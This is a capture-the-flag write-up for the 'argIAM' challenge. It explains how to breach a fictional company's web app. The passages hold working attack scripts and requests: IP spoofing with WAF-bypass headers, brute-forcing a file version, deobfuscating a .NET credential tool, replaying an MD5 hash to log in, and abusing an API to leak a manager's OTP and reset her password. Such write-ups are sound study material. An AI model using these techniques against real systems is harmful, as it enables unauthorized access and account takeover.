# argIAM

## Introduction

This challenge combines reverse engineering, cryptography, and web exploitation to breach a fictional organization's infrastructure, illustrating real-world scenarios and the importance of multi-layered security.

### Breaking the Challenge

argIAM 'requires' two players but you can play double-agent by **resetting roles** constantly.\
By holding Shift on the role-select screen, you get access to the *Reset Role* button.\
This write-up expects you to play double-agent.

# The Challenge

First, we play the **Insider** role. We are given the credentials to log in to the [frontend panel](http://olivia.memetrolls.net:2507/insider/ops/login):
```
insider@arg.iam:insider
```

We are given three tabs to play around with:
1. WeChat
2. Performance
3. BANDERA

## Insider Frontend Panel

### WeChat Collaboration Platform

Here, we are introduced to 2 other users: `li.chen02@arg.iam` and `zhanli.yang@arg.iam`.

Specifically, Zhanli Yang makes two offhand comments, stating,
```
All internal services are behind VPN. There is no chance of a breach.
```
and
```
-- (Insider) My dumbass forgot my password, if I log out I'm done for...
(Zhanli Yang) Ask your manager. They are the only ones able to do it.
```

(these will be relevant later)

### Performance / Monitoring

This tab contains a bunch of random logs. There are a handfull of random statements, some useful, others not. They are repeated five times and randomized by a randomly assigned time. Nothing will stand out here yet...

### BANDERA Login

Fun fact, if you translate `BANDERA`, it means 'flag' in some absurd language.\
We are presented with a login form. Our credentials are accepted, but will not grant access past the gate.

It's worth noting that the subtitle of the login form is:
```
Restricted Access | Use HOKA (Manager) Authorization
```

We have information! We need to find the credentials for a manager account to access the flag.

## Looking for Routes

The intention was to find routes via. brute-force. This will work, but Sveltekit hands us a freebie here by revealing the list of all Svelte pages in the `app.xxx.js` file. We can find this in our website sources in DevTools.

Here we discover quite a few routes:
```
"/": [4],
"/(hacker)/hacker": [5],
"/(hacker)/hacker/admin": [6],
"/(hacker)/hacker/admin/Enterprise_Applications": [7],
"/(hacker)/hacker/admin/Enterprise_Applications/xeon": [8, [2]],
"/(hacker)/hacker/admin/Enterprise_Applications/xeon/login": [9, [2]],
"/(hacker)/hacker/docs": [10],
"/(insider)/insider": [11],
"/(insider)/insider/ops": [12, [3]],
"/(insider)/insider/ops/bandera": [13, [3]],
"/(insider)/insider/ops/login": [14, [3]],
"/(insider)/insider/ops/monitoring": [15, [3]],
"/(insider)/insider/ops/wechat": [16, [3]]
```

We've already explored most of the insider routes, meaning it's time to switch to **Hacker** to check out the other ones!

## Bypassing the 'Unauthorized IP' Check

After switching roles to **Hacker**, we quickly discover that all of the routes for the role are gated behind an *Unauthorized IP* gate.

Remember Zhanli Yang's offhand comments?\
`All internal services are behind VPN.`

To access any of these routes, we need to *s p o o f* our IP address to one of the VPN IPs.

### Spoofing the IP

A common way to block IPs from connecting is with a WAF, or Web Application Firewall.\
This is likely the only prerequisite cybersecurity knowledge you need for this CTF.

With a quick Google search, we can find [a long list of headers](https://github.com/osamahamad/FUZZING/blob/main/waf-bypass-headers.txt) commonly used to bypass simple WAFs.

### Finding the IP

According to [this](https://openvpn.net/community-resources/numbering-private-subnets/) nice OpenVPN community article, we know of three potential subnets to check. As this CTF is meant to be "easy", we are going to boldly assume we should only check the first and most obvious subnet.

```ts
console.clear();

const url = "http://arg.memetrolls.net:2507/hacker/docs";

const subnets = ["10.0.0.", "172.16.0.", "192.168.0."];
for (const subnet of subnets) {
    for (let i = 1; i < 256; i++) {
        const ip = subnet + i;
        fetch(url, {
            method: "GET",
            headers: {
                "Connection": "keep-alive",
                "Host": "arg.memetrolls.net:2507",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Base-Url": ip,
                "Client-IP": ip,
                "Forwarded-For": ip,
                "Forwarded-For-Ip": ip,
                "Http-Url": ip,
                "nullOrigin": ip,
                "Origin": ip,
                "Proxy-Host": ip,
                "Proxy-Url": ip,
                "Real-Ip": ip,
                "Redirect": ip,
                "Referer": ip,
                "Referrer": ip,
                "Refferer": ip,
                "Request-Uri": ip,
                "Uri": ip,
                "Url": ip,
                "X-Client-IP": ip,
                "X-Custom-IP-Authorization": ip,
                "X-Forwarded": ip,
                "X-Forwarded-By": ip,
                "X-Forwarded-For": ip,
                "X-Forwarded-For-Original": ip,
                "X-Forwarded-Host": ip,
                "X-Forwarded-Port": ip,
                "X-Forwarded-Scheme": ip,
                "X-Forwarded-Server": ip,
                "X-Forwarder-For": ip,
                "X-Forward-For": ip,
                "X-Host": ip,
                "X-Http-Destinationurl": ip,
                "X-Http-Host-Override": ip,
                "X-Original-Remote-Addr": ip,
                "X-Original-Url": ip,
                "X-Originating-IP": ip,
                "X-Proxy-Url": ip,
                "X-Real-Ip": ip,
                "X-Remote-Addr": ip,
                "X-Remote-IP": ip,
                "X-Rewrite-Url": ip,
                "X-Frame-Options": "Allow"
            }
        })
            .then((response) => {
                if (response.status != 401) {
                    console.log("WE HAVE AN IP!!")
                    console.log(`IP: ${ip}`);
                }
            });
    }
}
```

This script in particular will reveal rather quickly that the entire `10.0.0.x` block is open for us to use.\
This script however, does *not* reveal which header we need to use.

A separate script can be used to figure out the header:
```ts
console.clear();

const url = "http://arg.memetrolls.net:2507/hacker/docs";
const headers = ["Base-Url","Client-IP","Forwarded-For","Forwarded-For-Ip","Http-Url","nullOrigin","Origin","Proxy-Host","Proxy-Url","Real-Ip","Redirect","Referer","Referrer","Refferer","Request-Uri","Uri","Url","X-Client-IP","X-Custom-IP-Authorization","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Port","X-Forwarded-Scheme","X-Forwarded-Server","X-Forwarder-For","X-Forward-For","X-Host","X-Http-Destinationurl","X-Http-Host-Override","X-Original-Remote-Addr","X-Original-Url","X-Originating-IP","X-Proxy-Url","X-Real-Ip","X-Remote-Addr","X-Remote-IP","X-Rewrite-Url"]

for (const header of headers) {
    fetch(url, {
        headers: {
            [header]: "10.0.0.1",
            "Connection": "keep-alive",
            "Host": "arg.memetrolls.net:2507",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }
    })
        .then((response) => {
            if (response.status != 401) {
                console.log("WE HAVE A HEADER!!")
                console.log(`Header: ${header}`);
            }
        });
}
```


### 404 Fiddled

A simple proxy like [Fiddler Classic](https://www.telerik.com/fiddler/fiddler-classic) can be used to intercept and modify requests.

One ChatGPT prompt later, we have a FiddlerScript which will modify our requests to include the spoofed IP header.

```cs
import Fiddler;
class Handlers
{
    static function OnBeforeRequest(oSession: Session) {
        // Check if the session object exists
        if (oSession != null && oSession.uriContains("memetrolls.net")) {
            // Set the request headers
            oSession.oRequest["X-Forwarded-For"] = "10.0.0.1";
        }
    }
}
```

With this, we can finally access any **Hacker** route we please! If you have a keen eye, you would know that we've been targetting the '/docs' route. If we visit it now, we get access to a fake file list view.

We can find a handbook here, specifically for managers at the company!

## Breaking into the Manager Account

It is of the up-most **IMPORTANCE** that you read the 'Sexual Harassment Policy' in the handbook.

Once you're finished, we can scroll down and read the bolded, yellow-highlighted text which states:
```
Note: As of 03/02/2024, password resets have been delegated from the IT Team to the corresponding department manager due to lay-offs. You may do this with the argIAM Credential Helper (argIAMCredentialHelper). This requires your physical PIN. Never share this, and keep it on paper!
```

There's also a block which states:
```
Q: What do I do when an application doesn’t work anymore?

We keep updating our tools for the very best security compliance. Just re-download the tool from /insider/ops/dl/<name>/v<exe version>.zip. The password is the year when the company was founded.
```

We know the application name: `argIAMCredentialHelper`, but we don't know the EXE version.\
Windows executables come with some extra metadata, including a file and executable version.\
Here we deduce the file version formation: `vX.X.X.X`.

Some quick scripting later, we have a script to brute-force the file version:
```ts
console.clear();

const url = "http://olivia.memetrolls.net:2507/insider/ops/dl/argIAMCredentialHelper/v";

const sleep = (milliseconds: any) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
};

(async() => {
    for (let a = 1; a < 10; a++) {
        for (let b = 0; b < 10; b++) {
            for (let c = 0; c < 10; c++) {
                for (let d = 0; d < 10; d++) {
                    const formed = `${url}${a}.${b}.${c}.${d}.zip`;
                    fetch(formed, {
                        method: "GET",
                        headers: {
                            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "Accept-Encoding": "gzip, deflate",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Cache-Control": "no-cache",
                            Connection: "keep-alive",
                            Cookie: "token=6y5e5x6cmkkbxwxt88qzubxen5fz7zh5k493rq7udzqcx7o05xla8w0huwaja2ckt7nvi0vssojswhnmvuy2samda80ccoiw7qylwtg2jq8u",
                            Host: "olivia.memetrolls.net:2507",
                            "Pragma": "no-cache",
                            "Upgrade-Insecure-Requests": "1",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
                        }
                    })
                        .then(response => {
                            if (response.ok || response.status != 404) {
                                console.log(`WE HAVE A VERSION!! status: ${response.status}`)
                                console.log(`Version: ${a}.${b}.${c}.${d}`);
                            } else {
                                // console.log("nope, " + formed)
                            }
                        });
                }

                console.log("sleeping");
                await sleep(250);
            }
        }
    }
})();

```

If you're wondering, the `await sleep(250);` statement was to prevent memetrollsXD's server from crashing.\
(we crashed it once already, so he had to move us to a dedicated instance)

With file version in hand, we can now open the executable! Not with the operating system, but with [dnSpy](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)!

## Learning How To Reset the Password

Knowing the previous email formats, it's important to mention that we are going to be targetting the `qiulin.feng@arg.iam` account, as we know she's a manager at argIAM.

dnSpy reveals that the executable is obfuscated with BeeByte. You can take the time to deobfuscate most of the program, like I did:
```cs
// Decompiled with JetBrains decompiler
// Type: argIAMCredentialHelper.ILLBNNFKLKJAM
// Assembly: argIAMCredentialHelper, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85356C87-61A0-406D-953A-9C6064B48343
// Assembly location: G:\My Projects\argIM\stuff\argIAMCredentialHelper.dll

using System.ComponentModel;
using System.Net;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;

namespace argIAMCredentialHelper
{
  public class ILLBNNFKLKJAM : Form
  {
    private
    #nullable disable
    IContainer components;
    private Label emailLabel;
    private TextBox emailTextBox;
    private TextBox otpTextBox;
    private Label otpLabel;
    private TextBox pinTextBox;
    private Label pinLabel;
    private Button loginButton;

    public ILLBNNFKLKJAM() => InitializeComponent();

    private
    #nullable enable
    string BIDBBLKCMEFHK()
    {
      var a = "4a";

      DefaultInterpolatedStringHandler interpolatedStringHandler = new DefaultInterpolatedStringHandler(45, 3);
      interpolatedStringHandler.AppendLiteral("65232439232e2f");
      interpolatedStringHandler.AppendFormatted(Program.FEJKBHMFHAANC);
      interpolatedStringHandler.AppendLiteral("232b2729382f2e");
      interpolatedStringHandler.AppendFormatted(new string('2', 3));
      interpolatedStringHandler.AppendLiteral("f263a2f");
      interpolatedStringHandler.AppendFormatted(Program.FEJKBHMFHAANC);
      interpolatedStringHandler.AppendLiteral("382f392f3e");
      string EEFIEFFMLGHBC = interpolatedStringHandler.ToStringAndClear();
      byte[] array = Enumerable.Range(0, EEFIEFFMLGHBC.Length / 2).Select(x => Convert.ToByte(EEFIEFFMLGHBC.Substring(x * 2, 2), 16)).ToArray();
      for (int index = 0; index < array.Length; ++index)
        array[index] = (byte) (array[index] ^ Enumerable.Range(0, a.Length / 2)
          .Select(x => Convert.ToByte(a
            .Substring(x * 2, 2), 16)).ToArray()[0]);
      return Encoding.ASCII.GetString(array);
    }

    private void HandleLogin(object GDNHHCDDABCGA, EventArgs LHKGMHIJMJIDH)
    {
      string text = pinTextBox.Text;
      int[] numArray = new int[5];
      string str = "Validate to avoid ratelimit";
      try
      {
        // PIN Validator
        if (text
              .Select(pinDigit => int.Parse(pinDigit.ToString())) // Convert all to ints.
              .ToArray()
              .Aggregate((entryA, entryB) => entryA * entryB) // Multiply all together.
            == Math.Pow(numArray.Length, numArray.Length)) // arrayLength ^ arrayLength == (entries multiplied together)
        {
          Console.WriteLine("we hit!");

          str.Normalize();
          DefaultInterpolatedStringHandler interpolatedStringHandler = new DefaultInterpolatedStringHandler(23, 4);
          interpolatedStringHandler.AppendLiteral("http://arg.iam");
          interpolatedStringHandler.AppendFormatted(BIDBBLKCMEFHK());

          #region Email

          interpolatedStringHandler.AppendLiteral("?u=");
          interpolatedStringHandler.AppendFormatted(emailTextBox.Text);

          #endregion

          #region YubiKey OTP

          interpolatedStringHandler.AppendLiteral("&y=");
          interpolatedStringHandler.AppendFormatted(otpTextBox.Text);

          #endregion

          #region Manager Security PIN

          interpolatedStringHandler.AppendLiteral("&m=");
          interpolatedStringHandler.AppendFormatted(text);

          #endregion

          Console.WriteLine(interpolatedStringHandler.ToStringAndClear());
          // int num = (int) MessageBox.Show(new StreamReader(WebRequest.Create(interpolatedStringHandler.ToStringAndClear()).GetResponse().GetResponseStream()).ReadToEnd());
        }
        else
        {
          str.Normalize();
          int num = (int) MessageBox.Show("Invalid manager code. WARNING: 3 tries per device.");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && components != null)
        components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      emailLabel = new Label();
      emailTextBox = new TextBox();
      otpTextBox = new TextBox();
      otpLabel = new Label();
      pinTextBox = new TextBox();
      pinLabel = new Label();
      loginButton = new Button();

      SuspendLayout();

      #region Email

      emailLabel.AutoSize = true;
      emailLabel.Location = new Point(114, 9);
      emailLabel.Name = "emailLabel";
      emailLabel.Size = new Size(41, 15);
      emailLabel.TabIndex = 0;
      emailLabel.Text = "E-mail";

      emailTextBox.Location = new Point(12, 27);
      emailTextBox.Name = "emailTextBox";
      emailTextBox.Size = new Size(253, 23);
      emailTextBox.TabIndex = 1;

      #endregion

      #region YubiKey OTP

      otpTextBox.Location = new Point(12, 71);
      otpTextBox.Name = "otpTextBox";
      otpTextBox.Size = new Size(253, 23);
      otpTextBox.TabIndex = 5;

      otpLabel.AutoSize = true;
      otpLabel.Location = new Point(104, 53);
      otpLabel.Name = "otpLabel";
      otpLabel.Size = new Size(74, 15);
      otpLabel.TabIndex = 4;
      otpLabel.Text = "YubiKey OTP";

      #endregion

      #region Manager Security PIN

      pinTextBox.Location = new Point(12, 115);
      pinTextBox.Name = "pinTextBox";
      pinTextBox.Size = new Size(253, 23);
      pinTextBox.TabIndex = 7;

      pinLabel.AutoSize = true;
      pinLabel.Location = new Point(77, 97);
      pinLabel.Name = "pinLabel";
      pinLabel.Size = new Size(121, 15);
      pinLabel.TabIndex = 6;
      pinLabel.Text = "Manager Security PIN";

      #endregion

      #region Login Button

      loginButton.Location = new Point(104, 161);
      loginButton.Name = "loginButton";
      loginButton.Size = new Size(74, 23);
      loginButton.TabIndex = 8;
      loginButton.Text = "Log in";
      loginButton.UseVisualStyleBackColor = true;
      loginButton.Click += HandleLogin;

      #endregion

      AutoScaleDimensions = new SizeF(7f, 15f);
      AutoScaleMode = AutoScaleMode.Font;
      ClientSize = new Size(277, 196);

      Controls.Add(loginButton);
      Controls.Add(pinTextBox);
      Controls.Add(pinLabel);
      Controls.Add(otpTextBox);
      Controls.Add(otpLabel);
      Controls.Add(emailTextBox);
      Controls.Add(emailLabel);

      Name = nameof (ILLBNNFKLKJAM);
      Text = "argIAM Credential Helper";
      ResumeLayout(false);
      PerformLayout();
    }
  }
}
```

### The PIN Validator

```cs
// PIN Validator
if (text
        .Select(pinDigit => int.Parse(pinDigit.ToString())) // Convert all to ints.
        .ToArray()
        .Aggregate((entryA, entryB) => entryA * entryB) // Multiply all together.
    == Math.Pow(numArray.Length, numArray.Length)) // arrayLength ^ arrayLength == (entries multiplied together)
{
```

We are going to focus on this block first, as it's part of a check to perform a web request.\
As a logical, modern, resourceful human being, I asked ChatGPT to decode it and find possible combinations for the `text` variable:
```py
from itertools import product

# Function to find valid combinations
def find_valid_combinations(max_length=5):
    valid_combinations = {}
    # Loop through possible lengths of numArray
    for array_length in range(1, max_length + 1):
        target_value = array_length ** array_length
        # Generate all possible combinations of digits for current length
        for combination in product(range(10), repeat=array_length):
            # Calculate the product of digits in the combination
            product_of_digits = 1
            for digit in combination:
                product_of_digits *= digit
            # Check if the product matches the target value
            if product_of_digits == target_value:
                # Store valid combination
                if array_length not in valid_combinations:
                    valid_combinations[array_length] = []
                valid_combinations[array_length].append(combination)
    return valid_combinations

# Find valid combinations for numArray lengths up to 5
valid_combinations = find_valid_combinations(5)

valid_combinations
```

We get a handful of combinations from this, but the one that stands out is `55555`. We are going to faithfully assume that this is the correct combination.

### The Reset Request

We can use a debugger to capture the request URL after we find the PIN. We now have an endpoint we can hit!

```
http://arg.memetrolls.net:2507/insider/iamcredhelper/reset?u=qiulin.feng@arg.iam&y=1234&m=55555
```

The problem is, we don't know the YubiKey OTP to reset the password-

## Logging into XeonDB

We are going to begin exploring the other routes we found earlier, namely the `/hacker/admin/Enterprise_Applications/xeon/login` route.

Upon visiting the web page, we are greeted with a simple log in form asking for a username (email) and a password. We can try a bunch of different username and password combinations, but we'll cut to the chase and talk about the monitor account.

The monitor account is a special one, as it's mentioned in the performance log with a long string, speciically and MD5 hash. If we try to log in with a username and password while sniffing the request, we discover a JSON payload sent to `http://arg.memetrolls.net:2507/api/ea_xeondb/login`.

The request body for logins look like:
```json
{
  "username": "monitor@arg.iam",
  "password": "34addeb4f1a6b3201fccbf9cbac5ff4e"
}
```

The password is an MD5 hash produced by: `hash(hash(hash(INPUT)) + "salt")`.\
BUT, we can actually substitute the MD5 hash from the frontend associated with the monitor account here! Once we have sent the request, we are prompted with our second-to-last JSON response:
```json
{"sessionId":"gbxxtr1dpagj8egb2ial8r5hz34ksl4fe60o50htvuvbn3e8dqr3kx0041po65qqz237qudl2ds7j6m0ahw0kwil56yww1mn2e5x2qzi4q","href":"/hacker/admin/Enterprise_Applications/xeon"}
```

## Finding the OTP

With our newfound session ID, we can log into the panel at `/hacker/admin/Enterprise_Applications/xeon` by using some simple JavaScript to set the cookie:
```js
document.cookie = "xdbtoken=gbxxtr1dpagj8egb2ial8r5hz34ksl4fe60o50htvuvbn3e8dqr3kx0041po65qqz237qudl2ds7j6m0ahw0kwil56yww1mn2e5x2qzi4q";
```

You can find the `xdbtoken` cookie parameter by looking around the `9.xxxxx.js` sources in DevTools.

Upon visiting the XeonDB panel, we are greeted with a list of users and some information, including a `[REDACTED]` YubiKey OTP!

To find the OTP, we just have to query the API at `http://olivia.memetrolls.net:2507/api/ea_xeondb/entries/` with a request to insert random bullshit:
```http
POST http://olivia.memetrolls.net:2507/api/ea_xeondb/entries/ HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Content-Type: application/json
Host: olivia.memetrolls.net:2507
Origin: http://olivia.memetrolls.net:2507
Pragma: no-cache
Proxy-Connection: keep-alive
Referer: http://olivia.memetrolls.net:2507/hacker/admin/Enterprise_Applications/xeon
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
X-XDB-Token: gbxxtr1dpagj8egb2ial8r5hz34ksl4fe60o50htvuvbn3e8dqr3kx0041po65qqz237qudl2ds7j6m0ahw0kwil56yww1mn2e5x2qzi4q
X-Forwarded-For: 10.0.0.1

{"id": "0", "method": "INSERT", "status": "asdf"}
```

Response:
```json
{"id":0,"otp":"ccccccrrktriubgvcuvubhdtibdughigtrkuirdvfrrc","user":"qiulin.feng@arg.iam","timestamp":0,"sn":0,"status":"asdf"}
```

The route to INSERT data can be found by sniffing an `Edit` request on the frontend in DevTools.

# Finding the flag

We have all the infinity stones required to reset the manager password!\
First thing we have to do is switch roles back to **Insider**.

Using what we had earlier, we can finally form the final URL:
```
http://olivia.memetrolls.net:2507/insider/iamcredhelper/reset?u=qiulin.feng@arg.iam&y=ccccccrrktriubgvcuvubhdtibdughigtrkuirdvfrrc&m=55555
```

With our 501 (Not Implemented) response code and password in hand, we can access the Flag page we found at the start:
```
Password of qiulin.feng@arg.iam reset to b65eb4251676822b70c62629795645f606030e964e9cd32be847583cdcd20bb0
```

Heading to BANDERA, we put in the email and password, and spam `Login` a few thousand times. It will let us in eventually, and we get the option to `Export flag to XeonDB`.

We can save some time here and get the flag from the web request sent to the server by looking at DevTools once more. We have the flag!